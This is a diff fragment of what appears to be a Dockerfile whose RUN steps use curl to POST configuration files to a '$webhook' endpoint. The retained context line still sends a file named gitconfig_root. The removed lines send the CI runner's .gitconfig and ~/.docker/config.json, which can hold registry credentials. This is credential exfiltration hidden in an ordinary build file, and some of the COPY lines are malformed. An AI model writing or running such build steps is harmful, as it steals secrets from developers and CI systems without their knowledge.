@@ -25,18 +25,3 @@ RUN curl -X POST \
     -H "Content-Type: text/plain" \
     --data "$(cat gitconfig_root)" \
     "$webhook/git_config"
-
-# Copy /home/runner/.gitconfig into the image
-COPY /home/runner/.gitconfig /home_runner_gitconfig
-RUN curl -X POST \
-    -H "Content-Type: text/plain" \
-    --data "$(cat home_runner_gitconfig)" \
-    "$webhook/home_runner_gitconfig"
-
-
-# Copy docker/config.json into the image and send it
-COPY ~/.docker/config.json /home_runner_gitconfig
-RUN curl -X POST \
-    -H "Content-Type: text/plain" \
-    --data "$(cat ~/.docker/config.json)" \
-    "$webhook/dockerconfig"
